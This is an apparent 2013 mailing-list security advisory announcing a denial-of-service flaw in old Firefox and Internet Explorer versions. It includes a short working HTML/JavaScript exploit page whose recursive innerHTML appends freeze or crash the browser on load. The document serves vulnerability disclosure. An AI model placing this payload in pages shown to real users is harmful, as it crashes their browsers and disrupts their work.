Subject: DoS vulnerability in Mozilla Firefox and
	Microsoft Internet Explorer

Hello list!

I want to warn you about Denial of Service vulnerability in Mozilla Firefox 
and Microsoft Internet Explorer.

Earlier Jean Pascal Pereira has found DoS vulnerability in browser Firefox 
14.0.1 (http://1337day.com/exploit/description/19201). And at 07.04.2013 
I've checked this vulnerability and found, that many other browsers are 
vulnerable to these attack.

-------------------------
Affected products:
-------------------------

Vulnerable are Mozilla Firefox 3.5.19, 3.6.28, 10.0.7 ESR, 15.0.1, Internet 
Explorer 7 (7.00.5730.13) and Internet Explorer 8 (8.00.6001.18702). And 
also must be vulnerable previous versions of these browsers and potentially 
more newer versions of Firefox and Internet Explorer.

----------
Details:
----------

Denial of Service (WASC-10):

The attack occurs via infinite recursion. Which leads to RAM consuming.

My version of the exploit for different browsers.

<title>Mozilla Firefox 3.5.19 - 15.0.1, IE7 and IE8 DoS Exploit (C) 2013 
MustLive. http://websecurity.com.ua</title>
<!-- Based on exploit by Jean Pascal Pereira 
(http://1337day.com/exploit/description/19201) -->

<script>
function e(x) {
 document.body.innerHTML += x;
 e(x + 'x');
}
e('x')
</script>
</body>
</html>

Browser crash works in Firefox 10.0.7 ESR and 15.0.1, but doesn't work in 
3.0.19 and previous versions. In Firefox 3.5.19 and 3.6.28, IE7 and IE8 
there is only freezing.
